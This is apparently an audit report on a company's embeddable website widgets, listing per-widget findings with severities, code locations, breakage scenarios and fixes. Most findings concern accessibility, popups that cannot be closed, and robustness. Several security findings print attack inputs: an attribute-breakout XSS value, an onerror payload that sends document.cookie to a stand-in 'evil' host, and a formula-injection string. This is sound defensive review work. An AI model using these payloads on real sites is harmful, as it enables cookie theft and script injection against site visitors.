- **🟡 Medium · accessibility** — Off-screen queued (posQ) and leaving (posX) slide cards remain keyboard-focusable
  - `public/widget-carousel.js:591-603 (cards), 280-291 (posQ/posX CSS)`
  - **Breaks:** A keyboard-only visitor Tabs through a 4+ slide carousel; focus lands on posQ/posX cards positioned off the visible area at opacity 0. The focus ring is clipped by overflow:hidden so nothing appears focused, and the user tabs through several dead invisible buttons before reaching real controls.
  - **Fix:** In _setPos/_layout set tabindex=-1 and aria-hidden=true on cards entering posQ/posX (and ideally posX/queued generally), restoring tabindex=0 / aria-hidden removal only for visible pos0/pos1/pos2, or apply the `inert` attribute to hidden cards.
- **⚪ Low · accessibility** — CTA link is an interactive <a> nested inside the card <button>
  - `public/widget-carousel.js:542 (a built into card button created at 592)`
  - **Breaks:** A screen-reader user on the hero slide meets a button labelled with the destination title/subtitle that also contains a link 'Explore ...'. Depending on the assistive tech, the nested link may be collapsed into the button and not announced or reachable as a separate actionable element, so the primary CTA can be missed.
  - **Fix:** Make the card wrapper a non-interactive element (e.g. a div with a keydown/click handler and role, or a plain figure) so the CTA anchor becomes a valid standalone link, or render the anchor only on the hero (pos0) as a sibling outside the clickable card wrapper.
- **⚪ Low · ux-ui** — Editor-facing empty-state copy is shown to public visitors of a slide-less widget
  - `public/widget-carousel.js:584-588`
  - **Breaks:** A published carousel whose config fails to load (network error -> fetchConfig null -> cfg {} -> empty slides), or one saved with all slide titles blank, shows a real site visitor an editor instruction to 'Add your first slide' instead of degrading silently or rendering nothing.
  - **Fix:** Gate the instructional copy behind an explicit editor/preview flag (e.g. a config option the editor sets) and render neutral/empty output (or nothing, collapsing the widget) on live embeds when there are no slides.

### `offers-grid`  — 4 findings (1 high, 1 medium, 2 low)

> The offers-grid widget is mostly sound: it uses Shadow DOM with :host{all:initial}, escapes heading/subheading/emptyText via esc(), has a correct double-init guard, shares a single card-load promise, and resolves every loading path to a terminal state (fetch failure and card-script failure both fall back to the empty state), so there are no dead-ends or circles of doom. Four real, code-anchored issues remain: an HTML-attribute injection via the unvalidated `columns` config into innerHTML, a resolveApiBase deviation that ignores window.__TG_WIDGET_API__ and falls back to a relative path, unwhitelisted colour config, and missing aria on loading/empty states. Card rendering itself is delegated to widget-offer-card.js and out of scope.

- **🟠 High · security** — Unvalidated `columns` config injected raw into innerHTML class attribute
  - `public/widget-offers-grid.js:154,195,211`
  - **Breaks:** A widget config with columns set to `2"><img src=x onerror=alert(document.cookie)>` (layout left at the default 'vertical') produces `<div class="tgog-items grid cols-2"><img src=x onerror=alert(document.cookie)>" data-items></div>`, breaking out of the class attribute; the img's onerror executes the injected script on the customer page when the grid mounts.
  - **Fix:** Whitelist columns to the known token set before use, e.g. `columns: ['2','3','4'].indexOf(String(c.columns)) !== -1 ? String(c.columns) : 'auto'`, so only safe tokens ever reach the class string.
- **🟡 Medium · robustness** — resolveApiBase ignores window.__TG_WIDGET_API__ and falls back to a relative path
  - `public/widget-offers-grid.js:60-63,220`
  - **Breaks:** A customer site injects widget-offers-grid.js dynamically/async so document.currentScript is null at execution; SCRIPT_BASE becomes '/', the fetch targets the customer's own origin (https://customer.com/api/saved-offers) which 404s, the catch on line 224 renders the empty state, and no offers ever appear with no console signal to the site owner.
  - **Fix:** Add a resolveApiBase() that returns window.__TG_WIDGET_API__ when set, then the script's own origin, and never leaves a bare '/' for the API and link base.
- **⚪ Low · security _(plausible)_** — accentColor / brandColor accepted without colour whitelist
  - `public/widget-offers-grid.js:157,179,248`
  - **Breaks:** A config with an arbitrary accentColor/brandColor string is propagated into the offer-page query string and into TGOfferCardWidget unchecked; IF the card renders it into a style or attribute, the unvalidated value flows through this widget to that sink. No sink is reachable within widget-offers-grid.js itself.
  - **Fix:** Validate accentColor/brandColor against a colour whitelist (e.g. /^#([0-9a-f]{3}|[0-9a-f]{6})$/i plus rgb/hsl) in _defaults and drop invalid values before forwarding, as defence in depth regardless of the card's own sanitisation.
- **⚪ Low · accessibility** — Loading and empty states expose no aria state to assistive tech
  - `public/widget-offers-grid.js:200,206`
  - **Breaks:** A screen-reader visitor loads a page with the grid; during the pending fetch they hear nothing, and when the feed returns no live offers the empty message is never announced, so they cannot tell whether the widget is still loading or genuinely empty.
  - **Fix:** Add aria-busy="true" to the items container during the loading state (clearing it when resolved) and role="status"/aria-live="polite" on the empty-state element so state changes are announced.

### `popup`  — 4 findings (1 high, 1 medium, 2 low)

> Reviewed all 1555 lines of public/widget-popup.js plus the editor and demo. The widget is generally solid: config values are escaped/whitelisted before hitting innerHTML (esc, safeColor, safeUrl, safeSlug, safeFontStack), resolveApiBase honours window.__TG_WIDGET_API__ then script origin, storage is prefixed/JSON/try-catch wrapped, double-init is guarded, Shadow DOM with :host{all:initial} is used, and there is proper focus return + a focus trap for modal layouts. No XSS, CSP, or injected-script issues found. Two real code-anchored problems: (1) Vimeo autoplay builds a malformed embed URL so every Vimeo video breaks by default, and (2) the editor lets an author switch off all three close controls on a non-overlay layout, producing a popup/bar a visitor can never dismiss. Two lower-severity items (duplicate document listeners on re-render, a default '#' CTA that goes nowhere) round it out.

- **🟠 High · robustness** — Vimeo autoplay produces a malformed embed URL that breaks the video
  - `public/widget-popup.js:1117 and :1126-1128`
  - **Breaks:** Author sets contentType 'video' with a Vimeo URL and enables videoAutoplay. The iframe src becomes 'https://player.vimeo.com/video/123&autoplay=1', which Vimeo does not resolve to a valid video id, so the visitor sees a broken/error iframe instead of the video. Affects every autoplay Vimeo popup; YouTube is unaffected because its base URL already carries a '?'.
  - **Fix:** Build the separator per URL rather than hard-coding '&': `const auto = cfg.videoAutoplay ? (embed.indexOf('?') === -1 ? '?' : '&') + 'autoplay=1' : '';` — or have getVideoEmbedUrl return the Vimeo embed already carrying a '?' (e.g. '.../video/'+id+'?autoplay=0' or just a trailing '?').
- **🟡 Medium · circle-of-doom** — Author can create a popup with no way to close it (unescapable state)
  - `public/widget-popup.js:1242-1247, :1338-1352, :983-985 / editor-popup.html:403-417`
  - **Breaks:** Author picks a bottom-bar announcement or email-capture popup, disables Show close button and Close on Escape (backdrop close is already irrelevant with no backdrop). The visitor sees a bar with no X, no Escape handling and no backdrop; it stays on screen for the whole session, potentially overlapping page content, with no keyboard or pointer escape.
  - **Fix:** Guarantee at least one dismissal path at render time: if the resolved layout has no backdrop and showCloseButton is false, force-render the close button or force closeOnEscape true; or add editor-level validation that blocks saving a config where no close affordance is reachable for the chosen layout.
- **⚪ Low · robustness** — Re-render re-binds document keydown listeners without removing the previous ones
  - `public/widget-popup.js:1414-1419 with :1348-1352 and :1357-1372`
  - **Breaks:** Visitor clicks two-step 'Yes' then submits the email form; up to three sets of Escape + focus-trap keydown listeners are attached to document simultaneously. Pressing Escape invokes close() several times (idempotent via isOpen) and the focus-trap logic runs redundantly on every Tab. No crash, just wasted work that only clears on final close.
  - **Fix:** At the top of _rerenderContent, run the accumulated cleanupFns (or at least the document-listener removers) and reset the array before calling _bind() again, so each render owns exactly one set of listeners.
- **⚪ Low · dead-end** — Default primary CTA points at '#', so the button does nothing but records a conversion
  - `public/widget-popup.js:380, :1004-1007, :1068-1070, :215-219, :1374-1380`
  - **Breaks:** Author enables an announcement popup but leaves the CTA URL at its '#' default. The visitor sees a prominent 'Find out more' button; clicking it scrolls to the top anchor, leaves the popup open, and records a conversion that hides the popup on future visits. The visitor got a do-nothing button and the popup is now suppressed.
  - **Fix:** When the resolved CTA URL is empty or '#', either omit the primary CTA button or do not bind its click as a conversion (skip data-tgp-cta / recordConverted). Ideally also surface an editor warning that the CTA has no destination.

### `worldmap`  — 4 findings (1 high, 1 medium, 2 low)

> The worldmap widget is largely well-built: Shadow DOM with :host{all:initial}, resolveApiOrigin honours __TG_WIDGET_API__ then script origin, all text/name/price interpolation is esc()'d, colours are hex-whitelisted (safeHex), the fullscreen overlay is genuinely escapable (Escape + backdrop + close button, focus-trapped, scroll-lock restored on close/destroy/update), fetches are token-guarded against out-of-order responses, and FX/deals/resorts endpoints all have error and empty states. The main real defect is a URL-interpolation XSS gap in the deal cards: safeUrl() whitelists the scheme but does not escape quotes, and its output is dropped into double-quoted src/href attributes unescaped, so a network-supplied image or deep-link URL containing a double quote can break out of the attribute. Secondary issues: the editor's "Show fullscreen button" toggle is a dead control (the widget never reads showFullscreenButton), an inline onerror handler in injected card HTML breaches the CSP-clean rule, and a malformed fullscreenUrl turns the fullscreen button into a silent no-op. No unescapable modals, infinite spinners, or retry loops were found.

- **🟠 High · security** — Deal-card image/link URLs bypass attribute escaping → XSS
  - `public/widget-worldmap.js:3701-3706 (safeUrl at 342-348)`
  - **Breaks:** A deal offer arrives with o.image = 'https://a.tld/x.jpg" onerror="fetch(`//evil/`+document.cookie)'. safeUrl passes it unchanged (matches https:), so line 3702 emits `<img src="https://a.tld/x.jpg" onerror="...">`; when the (bad) URL fails to load the injected onerror executes attacker JS inside the widget page. The same attribute break works on o.url via the card href (e.g. injecting onmouseover), and would fire on hover of the whole card anchor.
  - **Fix:** Escape the whitelisted URL for attribute context before interpolation: wrap both values as esc(img) / esc(href) in the template (esc already encodes " and '), or have safeUrl return an esc()'d string. Both the img src and the anchor href must be escaped.
- **🟡 Medium · dead-end** — 'Show fullscreen button' toggle does nothing (dead control)
  - `public/widget-worldmap.js:2160 and _render ~2299; editor-worldmap.html:356,463,574; demo-worldmap.html:83`
  - **Breaks:** An agency toggles 'Show fullscreen button' off in the editor and saves. On their live site the fullscreen CTA still renders and opens the overlay. demo-worldmap.html proves it: it sets showFullscreenButton:false yet the button appears. The user's explicit configuration is silently ignored.
  - **Fix:** Honour the flag in _render: only emit the `.tgwm-fs-btn` markup (or add the `hidden` attribute) when `c.showFullscreenButton !== false`. Note pins still open the overlay on click, so decide whether that path should also be gated when the button is hidden.
- **⚪ Low · security** — Inline onerror handler in injected card HTML violates CSP-clean rule
  - `public/widget-worldmap.js:3702`
  - **Breaks:** On a strict-CSP customer site, a hotel image URL that 404s (common with expiring supplier CDN links) can no longer hide itself, so the browser's broken-image placeholder shows in the deal card. Each broken image also emits a CSP violation report.
  - **Fix:** Drop the inline handler; attach the error handler in JS after insertion (build the <img> via createElement + addEventListener('error', ...), or delegate a single 'error' listener on the cards scroll container), consistent with the widget's other CSP-conscious code.
- **⚪ Low · dead-end** — Malformed fullscreenUrl makes the fullscreen button a silent no-op
  - `public/widget-worldmap.js:2330-2336`
  - **Breaks:** A widget is configured via API/inline data-tg-config with fullscreenUrl:'www.agency.com/map' (no protocol). safeUrl returns '#', so clicking the fullscreen CTA does nothing — no new tab and no in-page overlay fallback — a control that looks functional but dead-ends.
  - **Fix:** Fall back to the in-page overlay when the configured fullscreenUrl is unsafe: in _openFullscreen, when `safe === '#'` call `this._showOverlay()` instead of returning silently.

### `offers`  — 3 findings (1 high, 2 medium, )

> Reviewed public/widget-offers.js (9,526 lines), editor-offers.html and demo-offers.html. Security posture is strong: all text goes through esc(), all offer/config URLs through safeUrl() (blocks javascript:/data:/vbscript:/file:), images through safeImgUrl() (https-only) before cssBgUrl(), storage is tgop_/tgo_-prefixed + JSON + try/catch, resolveApiBase() honours window.__TG_WIDGET_API__ then script origin, apiKey stays server-side, double-init guard present, board timers cleared before re-scheduling, reduced-motion respected. No XSS sink, injected script, eval, or inline handler found in the embeddable widget. The real problems are all in the Popup template's lifecycle: an inactivity-triggered popup re-opens forever after the visitor dismisses it (a genuine circle of doom), the inline loading skeleton is never cleared so popup widgets show a block of grey cards on the page until/unless the trigger fires, and the editor lets a client disable every dismissal path at once, producing an unclosable popup. Three findings, no critical security issues.

- **🟠 High · circle-of-doom** — Inactivity-triggered popup re-opens forever after the visitor dismisses it
  - `public/widget-offers.js:1315-1330 (popupAttachTrigger 'inactivity'), :8493-8536 (_popupOpen), :8538-8566 (_popupClose), :8747-8748 (attach, cleanup stored but never called)`
  - **Breaks:** Client sets popupTrigger='inactivity' (editor default 30s) with popupFrequency='session' and suppress-after-dismiss enabled. Visitor sees the popup, clicks X (_popupClose sets _popupIsOpen=false). ~30s after their last mouse move the timer fires, _popupOpen's guard passes because _popupIsOpen is false, and the identical popup re-opens over the content. Dismissing again resets nothing permanent; it returns every 30s of inactivity for the entire session with no configured limit honoured.
  - **Fix:** Make the inactivity trigger one-shot: inside fire() (or on first fire) call events.forEach(e => document.removeEventListener(e, reset)) and clearTimeout(timer), mirroring the scroll/exit-intent branches. Alternatively invoke this._popupTriggerCleanup() at the top of _popupOpen once the popup shows. In all cases re-run popupShouldShow before any re-open so popupFrequency and suppress-after-dismiss/conversion are re-evaluated.
- **🟡 Medium · dead-end** — Popup-template widgets paint a permanent inline loading skeleton on the host page
  - `public/widget-offers.js:5706-5714 (_render), :5934-5950 (_showLoading), :6219-6223 (dispatch to _renderPopupTemplate), :8737-8748 (_renderPopupTemplate early returns / attach without clearing root)`
  - **Breaks:** Client embeds a popup-template offers widget with an exit-intent or 45s time trigger. From page load until the trigger fires — and forever if the visitor is on an excluded page, is a suppressed repeat visitor, or the cache returns no matching offers — six grey skeleton cards occupy the middle of the client's page where the widget is supposed to be invisible.
  - **Fix:** Skip _showLoading when cfg.template === 'popup' (the popup shows no inline UI), or clear this.root.innerHTML='' on every _renderPopupTemplate early return and before attaching the trigger, so the inline container occupies no space until _popupOpen renders the overlay.
- **🟡 Medium · circle-of-doom** — Popup can be configured with no working way to close it
  - `public/widget-offers.js:7822-7828 (_popupCloseBtn), :8462 (backdrop only for centered/fullscreen/side-drawer), :8568-8584 (_popupBind); editor-offers.html:3138-3140 (three free toggles)`
  - **Breaks:** Client keeps the default slide-in layout (no backdrop) and, chasing conversions, switches off 'Show close button' and 'Close on Escape' in the editor. The saved popup renders with no close button, ignores Escape, and has no backdrop to click. The visitor cannot dismiss it on any page view except by reloading or leaving the site.
  - **Fix:** Add a floor in the widget: if popupShowCloseButton is false AND popupCloseOnEscape is false AND (no backdrop or popupCloseOnBackdropClick false), force _popupCloseBtn to render (or force-bind Escape). Additionally warn or prevent in editor-offers.html when the client disables the last remaining dismiss path, taking the current layout's backdrop availability into account.

### `weather`  — 7 findings (2 medium, 5 low)

> The weather widget is largely well built: Shadow DOM with :host{all:initial}, consistent esc() on every text sink, a proper safeUrl() allowlist (https/mailto/tel only, no javascript:), correct resolveApiBase()/CONTENT_API resolution, numeric coercion of remote temps to block the documented '<img onerror>' vector, a double-init selector guard, reduced-motion support, and genuine empty/error/not-found states. The editor correctly boots via tgse.onReady (no synchronous isLoggedIn race), aborts in-flight searches, and handles 401/429/non-ok on every fetch. No XSS sink, no injected script, no eval, no leaked token was found. The real issues are around do-nothing / never-resolving states rather than security: a disabled CTA button shown to visitors by default, fetches with no timeout that can strand the loading skeleton forever, and focus being dropped when the unit toggle re-renders. Seven findings, none critical, ranked by visitor impact.

- **🟡 Medium · dead-end** — Default config shows visitors a permanently disabled 'Enquire now' CTA button (do-nothing control)
  - `public/widget-weather.js:1270-1286 (defaults 977-982, safeUrl 304-311)`
  - **Breaks:** An agent adds the weather widget, sets colours and destination, saves, and never opens/fills the CTA URL field. Live visitors see a prominent CTA bar with a disabled 'Enquire now' button that cannot be clicked and leads nowhere.
  - **Fix:** In _renderCta, when safeUrl(cta.url) is empty, return '' (omit the whole CTA section) rather than emitting a disabled button; or require a CTA URL in the editor before the CTA section can be enabled/saved. A disabled button is acceptable as an editor-preview affordance but should never render to a visitor.
- **🟡 Medium · circle-of-doom** — Destination/content fetch has no timeout — a stalled request leaves the loading skeleton shimmering forever
  - `public/widget-weather.js:1033-1047 (_loadDestination) and 1365 (init config fetch)`
  - **Breaks:** A visitor on a weak mobile link or behind a hung proxy/captive portal loads a page with the widget; the request stalls without responding or erroring. The visitor sees an endless loading shimmer with no content, no error, no retry.
  - **Fix:** Wrap both fetches in an AbortController with setTimeout(()=>controller.abort(),8000-10000), pass signal, and on abort fall through to _renderError() so the visitor gets the 'temporarily unavailable' notice instead of an infinite skeleton.
- **⚪ Low · accessibility** — Unit toggle (°C/°F) re-renders the whole content via innerHTML and drops keyboard focus
  - `public/widget-weather.js:1307-1318 (_bind) and 1049-1069 (_renderContent)`
  - **Breaks:** A keyboard user Tabs to the °F button and presses Enter; the chart re-renders, the old button is removed, and focus is lost. The user must Tab back through the page to continue, and this repeats on every unit switch.
  - **Fix:** After _renderContent() re-renders following a unit toggle, restore focus to the new .tgw-climate-unit[data-unit=<active>] button via .focus(); or update only the temp/aria-pressed nodes in place instead of replacing all innerHTML.
- **⚪ Low · robustness** — Double-init race for remote-config widgets fires a duplicate config fetch and logs a shadow-root error
  - `public/widget-weather.js:1350-1384 (init), 945 (guard set), 1397-1419 (MutationObserver)`
  - **Breaks:** A page injects or mutates DOM containing the widget while its config fetch is in flight (or a second matching node is added), triggering a second init() that re-processes the same element: two /api/widget-config requests and a logged shadow-root error.
  - **Fix:** Set el.setAttribute('data-tg-initialised','true') (or a 'pending' marker) synchronously in init() before the await, so a concurrent pass skips the element while its fetch is in flight.
- **⚪ Low · robustness** — Rainfall bars render height:NaN% for undefined or non-numeric rainfall entries
  - `public/widget-weather.js:1203-1207 (rainCells) and 1186-1187 (hasRain/maxRain)`
  - **Breaks:** A destination whose climate.rainfall array has undefined slots or a stray non-numeric string renders those rain cells with height:NaN%; the bar collapses to the fallback minimum instead of showing the true proportion.
  - **Fix:** Coerce each cell like the temps: const rn=Number(r); const h=Number.isFinite(rn)?Math.max(2,Math.round((rn/maxRain)*100)):2; so non-numeric months get a defined minimal height.
- **⚪ Low · accessibility** — Screen-reader chart description is announced twice and hardcodes °C regardless of selected unit
  - `public/widget-weather.js:1229-1230 and 911-921 (climateSrDescription)`
  - **Breaks:** A screen-reader user toggles to °F: the visible bars show Fahrenheit but the announced description reads Celsius numbers with '°C', and the whole paragraph is read twice.
  - **Fix:** Keep either the sr-only <p> or the role='img' aria-label, not both. Pass the active unit into climateSrDescription so values and the °C/°F suffix match the toggle, and guard non-numeric temps (skip or say 'no data').
- **⚪ Low · security** — Editor search results interpolate r.level into innerHTML without escaping
  - `public/editor-weather.html:1054-1057 (runSearch)`
  - **Breaks:** The search endpoint returns a record whose level contains a double-quote or angle bracket (data corruption or a future free-text level); the attribute breaks out or markup is injected into the agent-facing editor.
  - **Fix:** Wrap r.level in escHtml() in both positions (matching r.name), or whitelist it against known values ('country','city','resort') before rendering.

### `airport`  — 5 findings (1 medium, 4 low)

> The airport widget is largely clean: consistent esc() sanitisation, whitelisted colours/URLs/IATA/coords, correct Shadow DOM isolation, robust fetch error handling (404/non-ok/malformed JSON all covered), a working double-init guard, and map instances cleaned up on destroy. No XSS sinks, no CSP violations, no config strings routed through innerHTML. The real problems are dead-end presentation states — chiefly a call-to-action band that renders a headline promising action but shows no button in its default (blank-URL) configuration, plus resort chips that link to "#" and jump the host page to the top. A few low-severity UX/a11y and unbounded-retry issues round it out. Nothing critical.

- **🟡 Medium · dead-end** — CTA section renders a headline with no button (dead-end) in its default configuration
  - `public/widget-airport.js:1337-1361`
  - **Breaks:** Client saves an origin airport widget without filling the Button URL (the default), and the airport record has no officialWebsite. The visitor sees the CTA band 'Flying from London Gatwick?' with subtitle 'Search flights, hotels and transfers from LGW' and no button. For an origin airport (no Serves strip) the CTA is the terminal section, so the visitor is left at a promise with no way to act.
  - **Fix:** Only render the `.tga-cta` wrapper when at least one action exists: gate on `if (!url && !official) return '';` (in addition to keeping title/sub optional), or fall the primary button back to a sensible default destination when url is blank. Do not emit a headline without a button.
- **⚪ Low · dead-end** — Resort 'Serves' chips fall back to href="#", jumping the host page to the top
  - `public/widget-airport.js:1140-1157`
  - **Breaks:** A destination airport lists three resorts, one without a guide URL. The visitor clicks that chip expecting a resort guide; the host page scrolls to the top and nothing else changes — a do-nothing control that also disrupts scroll position.
  - **Fix:** When safeUrl(r.url) is empty, render the chip as a non-interactive `<span class="tga-chip">` (no href, no hover affordance) instead of `<a href="#">`, mirroring the omit-when-empty pattern already used in the map popup at line 1430.
- **⚪ Low · ux-ui** — Map failure leaves a blank grey box with no fallback message
  - `public/widget-airport.js:1374-1449`
  - **Breaks:** A visitor on a corporate network that blocks unpkg.com loads the widget. The 'Located' section shows a 320px blank grey rectangle with no explanation. The Google/Apple Maps footer links still work, so it is not a full trap, but the primary map surface is a confusing dead visual.
  - **Fix:** In the .catch handler, replace the map host content with a short fallback (coordinates plus the existing external map links, or a 'Map unavailable' note), or collapse the map-wrap so the footer links stand alone.
- **⚪ Low · circle-of-doom** — Editor preview retries forever if the widget script never loads
  - `public/editor-airport.html:750-753`
  - **Breaks:** A deploy ships editor-airport.html but widget-airport.js 404s or throws during parse. The editor user sees a permanently empty preview pane with no error while renderPreview spins every 60ms indefinitely.
  - **Fix:** Cap the retries (e.g. stop after ~50 attempts / 3s) and render a visible 'Preview unavailable — widget script failed to load' message in the mount when the cap is reached.
- **⚪ Low · accessibility** — Getting-there tabs lack full ARIA tab wiring and arrow-key navigation
  - `public/widget-airport.js:1223-1236,1451-1471`
  - **Breaks:** A screen-reader user hears 'tab, selected' but the reader cannot announce which panel the tab controls, and a keyboard user cannot use Left/Right arrows to move across tabs as role=tablist implies.
  - **Fix:** Give each tab an id and aria-controls pointing at its panel id, give each panel aria-labelledby pointing back to its tab, and add ArrowLeft/ArrowRight (and optionally Home/End) handling in _bind to move focus and activation across the tablist.

### `api-security`  — 5 findings (1 medium, 4 low)

> Reviewed api/widget-config.js, api/_auth.js, api/widget-auth.js and public/auth-client.js. The core ownership model is sound: canModifyWidget() fails closed in every branch, plan/entitlement gating is enforced server-side at create time, sanitiseConfig/sanitiseForFormula run before persistence and formulas, JWT verification pins HS256 (no alg:none bypass), and the Airtable API key stays server-side. Public GET returning any config is intentional (embeds must load unauthenticated). I found five real, code-anchored issues: one cross-tenant internal-ID leak (recordId handed to any authenticated session regardless of ownership), a formula-injection weakness where sanitiseForFormula truncates AFTER escaping (a trailing lone backslash can escape the closing quote), a missing upstream-response check on the POST update path that silently degrades an edit into a create, a timing-unsafe client-code comparison that contradicts its own "constant-time" comment, and rate-limit/count keys built on a possibly-undefined email after swallowed hydration failures. None are catastrophic but the first two warrant fixing.

- **🟡 Medium · robustness** — POST update path does not check searchResp.ok, so an Airtable hiccup silently turns an edit into a create
  - `api/widget-config.js:811-814`
  - **Breaks:** A user clicks Save during an Airtable 429/5xx blip. The lookup returns an error body (no records). Instead of surfacing an error or updating the existing record, the endpoint creates a second widget with a fresh tgw_ id, orphaning the original and inflating the dashboard count; if the user is at their plan cap the same fall-through 403s a legitimate edit.
  - **Fix:** Add `if (!searchResp.ok) await throwAirtableError('Update lookup failed', searchResp);` immediately after the fetch at line 811, mirroring the GET (629) and DELETE paths, so upstream failures surface as a handled 5xx instead of degrading into a create.
- **⚪ Low · security** — GET leaks any widget's internal Airtable recordId to any authenticated session (cross-tenant IDOR)
  - `api/widget-config.js:714-720`
  - **Breaks:** An attacker with any free Spark account (valid session) scrapes a competitor's site, reads data-tg-id="tgw_..." from the embed, calls GET /api/widget-config?id=<victimWidgetId> with their Bearer token, and receives { ..., recordId: "rec..." } for a widget they do not own. They learn the internal record id but cannot use it against /api/routing-configs because that endpoint independently checks ownership by email.
  - **Fix:** Only attach payload.recordId when the session actually owns the widget: reuse canModifyWidget(widgetRecord, { sessionClientId: captureSessionClientId(auth.user), userEmail: auth.user.email }) === true as the gate (after hydrating email) instead of merely checking that a session exists.
- **⚪ Low · security** — sanitiseForFormula truncates AFTER escaping, so attacker-controlled input can end in a lone backslash (formula corruption)
  - `api/_auth.js:275-281`
  - **Breaks:** Authenticated user POSTs { widgetId: 'a' + "'".repeat(250), config: {...} }. sanitiseForFormula returns a string ending in a lone backslash; the filterByFormula becomes {WidgetID} = 'a\'...\' with the closing quote escaped, so Airtable returns a 422. Because the update path never checks searchResp.ok (finding #3), searchData.records is undefined and the request falls through to create a new widget.
  - **Fix:** Cap length BEFORE escaping (slice the raw input to a safe max, then escape), or after escaping strip a trailing odd run of backslashes. Additionally give widgetId in the POST body an explicit pre-sanitise length cap (<=100) mirroring the GET path at line 619.
- **⚪ Low · security** — Client-code comparison is not constant-time despite the "constant-time-ish" comment
  - `api/widget-auth.js:76`
  - **Breaks:** An attacker able to distribute around the per-IP/per-email rate limit (many IPs) measures response latency to incrementally recover a target account's ClientCode faster than blind brute force — though the rate limit makes this impractical in normal operation.
  - **Fix:** Compare with crypto.timingSafeEqual over equal-length buffers (hash both sides to a fixed length first to avoid the length-based early exit), or at minimum correct the misleading comment to describe the actual non-constant-time comparison.
- **⚪ Low · robustness** — Save rate-limit and plan-count keys are built on user.email which can be undefined after a silently-swallowed hydration miss
  - `api/widget-config.js:760`
  - **Breaks:** Airtable is briefly slow or a user row has a blank Email field, so hydrateLegacyUserFields leaves user.email undefined without erroring. A cookie-session user saving an unlimited (planLimit -1) widget gets a record written with ClientEmail omitted (and possibly ClientRecordId omitted), weakening later credential/ownership resolution; meanwhile every such user is throttled under a single shared save:undefined rate-limit key.
  - **Fix:** After hydration, hard-fail the write (401/500) if user.email is still missing rather than proceeding with an undefined identity, and fall back to a stable per-session key (user.recordId or sessionId) for the rate limiter when email is absent so distinct users don't share the save:undefined bucket.

### `appointment`  — 5 findings (3 medium, 2 low)

> The appointment widget is well built and notably clean on security: every config/network string that reaches innerHTML is run through esc(), colours/fonts/numbers are whitelisted/clamped, URLs (Google Calendar, .ics, manage link) pass through safeUrl(), Shadow DOM with :host{all:initial} is used, storage/JSON parses are try/catch wrapped, and the double-init guard is present. No XSS sinks, CSP violations, or client-trusted gating were found. The real issues are a handful of robustness/UX/accessibility problems, the sharpest being a crash in the backend availability-refine path when the server reports a fully-booked calendar, and the absence of any "nothing available" state (both leave a visitor on a silent, all-greyed calendar). Findings ranked by user impact below.

- **🟡 Medium · robustness** — Backend availability refine crashes when the server returns zero open slots
  - `public/widget-appointment.js:797,803,855`
  - **Breaks:** A live (data-tg-id, non-preview) appointment widget whose owner is fully booked for the whole date window. GET /api/appointment/availability returns {slots:[]}. The refine .then sets viewMonth=null and calls _renderMonth(), which throws an uncaught TypeError (unhandled rejection in console). The intended 'jump to first open month' handling never completes, and the widget keeps showing the client-baseline calendar offering days the server considers busy.
  - **Fix:** Early-return or fall back to today's month inside _renderMonth when this.viewMonth is null, and in the refine callback render an explicit 'no availability' empty state instead of setting viewMonth=null then re-painting the month grid.
- **🟡 Medium · dead-end** — No 'nothing available' state — visitor stranded on an all-greyed calendar
  - `public/widget-appointment.js:741-744,872,895`
  - **Breaks:** Config where blackout dates cover the only enabled weekday within a short dateRangeDays window (e.g. a 7-day range with only Saturday enabled and that Saturday blacked out) yields slotsByDate={}. The visitor lands on a greyed calendar with no clickable days, no explanation and no next step.
  - **Fix:** When availableKeys is empty, render an explicit empty state in the main panel (reuse noTimesLeft copy or a 'No times available right now' message) and keep the 'Meetings' back affordance reachable even for single event types.
- **🟡 Medium · accessibility** — Keyboard focus is lost on every step/re-render transition
  - `public/widget-appointment.js:684,723,747,824,902`
  - **Breaks:** A keyboard-only or screen-reader user presses Enter on a day; the calendar re-renders and focus resets to body, forcing a full re-Tab through the calendar to reach the times. After choosing a slot the confirm form appears with focus still on body, so the name field and the step change are not announced.
  - **Fix:** After each transition move focus to a sensible anchor (times panel heading, Back button, or first form input) and add aria-live to step changes so assistive tech is told the view changed (the success screen already does this).
- **⚪ Low · robustness** — Backend booking endpoints use raw SCRIPT_ORIGIN with a relative-path fallback
  - `public/widget-appointment.js:230-235,611,952,1084`
  - **Breaks:** A CMS or tag manager injects the widget script via innerHTML/dynamic append (currentScript null) on a customer domain. SCRIPT_ORIGIN becomes '', so a live booking POSTs to https://customer-site.com/api/appointment/book (404) and the booking fails with the generic networkError message; availability and manage links break the same way.
  - **Fix:** Resolve one API origin once — honour a window.__TG_WIDGET_API__ origin, fall back to scanning script[src*='widget-appointment'] tags, then a hardcoded widgets host — and use it for config and all backend endpoints so a missing currentScript never yields a relative /api path.
- **⚪ Low · robustness** — ICS blob object URLs are never revoked
  - `public/widget-appointment.js:1114-1128,1137`
  - **Breaks:** On a long-lived single-page host that keeps re-instantiating or re-showing the widget, a visitor who books repeatedly (via 'Need a different time?' in client mode, or repeated widget re-renders) accumulates undisposed blob URLs. Minor but unbounded.
  - **Fix:** Store the created object URL on the instance and call URL.revokeObjectURL on the next render and in destroy().

### `attraction`  — 5 findings (1 medium, 4 low)

> The attraction widget is largely clean, especially on security: text is escaped via esc() everywhere it reaches innerHTML, URLs pass safeUrl() (http/https only), the hero background URL passes a strict regex that blocks CSS/url() breakout, hexToRgba validates hex before use, and there are no modals or focus traps so there are no unescapable states or circles of doom. Fetch paths handle non-2xx (404 -> not-found, other -> error state) and malformed JSON. The one genuine robustness bug is a double-init race on the production remote-embed path (no synchronous guard is set before the async config fetch, so a MutationObserver re-fire during the fetch window can construct two widgets for the same element and leak the first map). The remaining items are lower-severity: a Leaflet script/CSS injected into the host document.head (CSP deviation, but SRI-pinned and degrades gracefully), a call-to-action that renders a heading and body but no button when the URL is left blank (the default), a mild map scroll-wheel-zoom hijack, and an unlabelled editor search input. Nothing strands a visitor.

- **🟡 Medium · robustness** — Remote-embed (data-tg-id) path has no synchronous double-init guard — MutationObserver can build two widgets for one element
  - `public/widget-attraction.js:757-780 (guard set only at line 335)`
  - **Breaks:** Customer page with background DOM activity (ads, analytics injecting nodes) plus a slow /api/widget-config response: a mutation fires the debounced observer ~120ms in while the fetch is still pending, init() re-runs, the element is still unmarked, a second fetch and second TGAttractionWidget are built on the same container; the first map instance is orphaned and the widget renders twice.
  - **Fix:** In the data-tg-id branch set a synchronous marker before starting the fetch, e.g. el.setAttribute('data-tg-initialised','true') (or a distinct 'pending' flag) immediately before fetch(), so a re-entrant init() skips it. Keep it consistent on failure (the .catch still constructs a widget, which sets it anyway).
